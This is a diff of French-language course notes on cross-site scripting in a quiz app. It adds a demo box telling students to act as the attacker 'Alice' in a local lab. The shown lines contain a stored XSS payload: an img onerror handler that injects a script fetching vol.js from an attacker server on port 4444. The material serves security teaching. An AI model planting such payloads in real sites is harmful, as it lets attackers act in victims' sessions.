@@ -51,7 +51,7 @@ session](/notes_de_cours/auth/session)) : `document.cookie` ne le voit pas,
 donc le XSS ne le **vole** pas. Mais il n'en a pas besoin pour agir : le
 navigateur de la victime joint l'API avec ce cookie tout seul.
 
-## Une attaque réaliste : voler dans la session
+## Une attaque réaliste pour Quiz M9
 
 Une autrice malveillante, **Alice**, lance son propre serveur, sur une autre
 machine (ici, le port 4444 du poste). Le dépôt en fournit un dans
@@ -68,6 +68,15 @@ un script hébergé sur son serveur :
 ```html
 <img src=x onerror="s=document.createElement('script');s.src='http://localhost:4444/vol.js';document.body.append(s)">
 ```
+
+:::warning
+
+Pour la démonstration, jouez Alice dans une fenêtre privée : « Se connecter »,
+identifiant `alice`, mot de passe `alice`. Créez-y un questionnaire avec la
+description ci-dessus, puis ouvrez le catalogue dans une fenêtre normale,
+connecté avec votre compte GitHub.
+
+:::
 
 La balise `<img>` a une source invalide : son `onerror` s'exécute et ajoute
 une balise `<script>` qui va chercher `vol.js` chez Alice. La description
